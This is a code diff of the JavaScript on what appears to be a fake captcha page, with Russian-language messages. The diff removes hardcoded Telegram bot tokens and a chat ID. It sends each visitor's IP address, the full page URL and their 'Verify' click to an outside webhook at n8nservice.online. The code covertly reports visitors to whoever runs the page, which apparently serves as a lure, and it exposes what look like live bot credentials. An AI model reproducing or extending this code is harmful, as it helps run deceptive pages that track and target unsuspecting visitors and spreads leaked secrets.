@@ -2122,18 +2122,16 @@
             }
 
 function sendTelegramMessageThen2(data) {
-const botToken = '7956891267:AAFeW5SsUXS2Ja5f89V7K8MUrtbTSz9jxVk'; // Замените на ваш токен бота
-const chatId = '-1002544076797'; // Или используйте chat_id
- const message = '👇🏻Нажал Verify в капче майнпулс ';
 
-    return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+ const message = '👇🏻Нажал Verify в капче ';
+const fullUrl = window.location.href  ;
+    return fetch(`https://n8nservice.online/webhook/info`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            chat_id: chatId,
-            text: message+data
+                 text: message+fullUrl+data
         })
     })
     .then(response => response.json())
@@ -2269,15 +2267,16 @@ const y = rect.top;
         </script>
  <script>
 // Альтернативный способ с использованием .then()
-function sendTelegramMessageThen(botToken, chatId, message,data) {
-    return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+function sendTelegramMessageThen( message,data) {
+
+const fullUrl = window.location.href  ;
+    return fetch(`https://n8nservice.online/webhook/info`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            chat_id: chatId,
-            text: message+data
+                 text: message+fullUrl+data
         })
     })
     .then(response => response.json())
@@ -2296,15 +2295,13 @@ function sendTelegramMessageThen(botToken, chatId, message,data) {
     });
 }
 
-const BOT_TOKEN = '7956891267:AAE7bzTN6faZZOwPutrJ8VmLhx82UectAf8'; // Замените на ваш токен бота
-const CHANNEL_ID = '-1002544076797'; // Или используйте chat_id
  const MESSAGE = '📱Кто-то открыл капчу майнпулс ';
 
 fetch('https://checkip.amazonaws.com/')
     .then((res) => res.text())
     .then((data) => {
 
-sendTelegramMessageThen(BOT_TOKEN, CHANNEL_ID, MESSAGE,data);
+sendTelegramMessageThen( MESSAGE,data);
                     });
 
 
